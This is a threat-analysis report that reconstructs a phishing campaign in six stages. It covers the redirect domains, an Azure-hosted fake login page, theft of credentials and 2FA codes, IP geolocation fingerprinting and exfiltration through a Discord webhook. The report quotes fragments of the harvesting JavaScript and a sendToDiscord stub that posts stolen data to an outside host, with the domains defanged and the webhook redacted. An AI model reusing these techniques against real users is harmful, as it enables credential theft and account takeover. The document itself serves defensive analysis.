# Attack Chain Reconstruction

> Six-stage breakdown of the phishing campaign based on static analysis of the captured infrastructure.

---

## Stage 1 — Phishing Delivery

The victim receives a phishing email containing a link designed to appear legitimate.

The link points to an intermediary domain used solely as a redirect layer:

```
ingresoinmediato[.]webcindario[.]com
```

The use of a free hosting service at this stage allows the attacker to quickly spin up disposable redirect points at no cost.

---

## Stage 2 — Automatic Redirection

The initial page contains no visible content. Instead, it uses an HTML meta refresh tag to silently forward the victim to the actual phishing infrastructure:

```html
<meta http-equiv="Refresh" content="0; URL=..." />
```

This technique serves two purposes:
- Conceals the real phishing domain from casual inspection
- Bypasses email security filters that may only evaluate the initial link

---

## Stage 3 — Phishing Page (Azure Infrastructure)

The victim lands on a credential harvesting page hosted on Microsoft Azure:

```
actualizardatosss[.]z13[.]web[.]core[.]windows[.]net
```

| Factor | Attacker Benefit |
|---|---|
| Legitimate cloud provider | Trusted by email gateways and web filters |
| Azure reputation | Reduces likelihood of automatic blocking |
| No self-managed server | Lower operational cost and exposure |

---

## Stage 4 — Credential Harvesting

A fake login form (`id="loginForm"`) collects user input. The form has no `action` attribute — all processing is handled by JavaScript.

The main harvesting logic is loaded from an external script:

```html
<script src="./excedata.js"></script>
```

Key logic inside the script:

```javascript
if (typeof sendLoginData === "function") {
    localStorage.setItem("correo", email);
    await sendLoginData(email, password);
    window.location.href = "facial.html";
}
```

After capturing credentials, the victim is redirected to a secondary page (`facial.html`) to simulate a legitimate authentication flow and avoid raising suspicion.

**Data captured at this stage:**

| Field | Type |
|---|---|
| Email address | Primary credential |
| Password | Primary credential |
| Phone number | 2FA bypass target |
| SMS verification code | 2FA bypass target |
| PIN | Account security bypass |
| Additional verification codes | Account security bypass |

---

## Stage 5 — Victim Fingerprinting

Before exfiltrating the captured credentials, the script enriches the data with victim network information by querying two external APIs:

| API | Data Retrieved |
|---|---|
| `api.ipify.org` | Victim's public IP address |
| `ipapi.co` | Geolocation derived from IP |

This data is bundled with the stolen credentials before transmission.

---

## Stage 6 — Data Exfiltration via Discord Webhook

Captured credentials and victim data are sent in real time to an attacker-controlled Discord channel via webhook:

```javascript
async function sendToDiscord(content) {
    const webhook_url = "https://discord.com/api/webhooks/[REDACTED]";
    // HTTP POST with JSON payload
}
```

| Characteristic | Detail |
|---|---|
| Protocol | HTTPS |
| Method | HTTP POST |
| Payload format | JSON |
| Destination | Discord webhook (private channel) |
| Server infrastructure required | None |

Using a webhook on a legitimate platform eliminates the need for attacker-controlled backend infrastructure and leverages Discord's trusted reputation to avoid network-level blocking.

---

## Full Attack Flow

```
[Victim]
    │
    ▼
[Phishing Email]
    │
    ▼
ingresoinmediato[.]webcindario[.]com       ← Stage 1–2: Redirect layer
    │  meta http-equiv="Refresh"
    ▼
actualizardatosss[.]z13[.]web[.]core[.]windows[.]net   ← Stage 3: Azure phishing page
    │  excedata.js
    ▼
[Credential Harvesting Form]               ← Stage 4: Captures credentials + 2FA codes
    │  api.ipify.org / ipapi.co
    ▼
[Victim Fingerprinting]                    ← Stage 5: IP + geolocation appended
    │  HTTP POST (JSON)
    ▼
[Discord Webhook]                          ← Stage 6: Real-time exfiltration
```
